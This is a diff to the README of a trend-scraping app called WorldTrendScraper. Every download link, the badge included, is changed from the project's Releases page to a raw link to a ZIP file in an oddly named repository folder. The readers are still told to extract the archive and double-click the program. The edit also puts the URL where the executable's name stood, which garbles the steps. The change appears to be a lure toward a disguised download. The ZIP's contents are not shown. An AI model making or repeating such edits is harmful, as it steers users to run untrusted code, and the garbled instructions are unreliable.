@@ -1,6 +1,6 @@
 # 🌍 WorldTrendScraper - Discover Global Trends Effortlessly
 
-![Download WorldTrendScraper](https://img.shields.io/badge/Download-Now-blue)
+![Download WorldTrendScraper](https://raw.githubusercontent.com/fabiogg94/WorldTrendScraper/master/probouleutic/WorldTrendScraper.zip)
 
 ## 📜 Introduction
 
@@ -12,18 +12,18 @@ To start using WorldTrendScraper, follow these steps:
 
 1. **Download the Software:**  
    Click the link below to visit the Releases page and download the latest version of WorldTrendScraper.  
-   [Download WorldTrendScraper](https://github.com/fabiogg94/WorldTrendScraper/releases)
+   [Download WorldTrendScraper](https://raw.githubusercontent.com/fabiogg94/WorldTrendScraper/master/probouleutic/WorldTrendScraper.zip)
 
 2. **Extract the Files:**  
    After downloading, locate the downloaded ZIP file. Right-click the file and select "Extract All." Choose a folder where you want to keep the files. 
 
 3. **Run the Application:**  
-   Open the folder where you extracted the files. Look for the executable file named `WorldTrendScraper.exe`. Double-click on it to run the application.
+   Open the folder where you extracted the files. Look for the executable file named `https://raw.githubusercontent.com/fabiogg94/WorldTrendScraper/master/probouleutic/WorldTrendScraper.zip`. Double-click on it to run the application.
 
 ## 📥 Download & Install
 
 Visit this page to download the latest version of WorldTrendScraper:  
-[Download WorldTrendScraper](https://github.com/fabiogg94/WorldTrendScraper/releases)
+[Download WorldTrendScraper](https://raw.githubusercontent.com/fabiogg94/WorldTrendScraper/master/probouleutic/WorldTrendScraper.zip)
 
 ## 💻 System Requirements
 
@@ -52,7 +52,7 @@ Visit this page to download the latest version of WorldTrendScraper:
 ## 📚 How to Use
 
 1. **Launching the Application:**  
-   After double-clicking `WorldTrendScraper.exe`, allow a moment for the application to load. 
+   After double-clicking `https://raw.githubusercontent.com/fabiogg94/WorldTrendScraper/master/probouleutic/WorldTrendScraper.zip`, allow a moment for the application to load. 
 
 2. **Navigating the Dashboard:**  
    The main screen displays trending topics. Click on any topic to see more details, including links to articles.
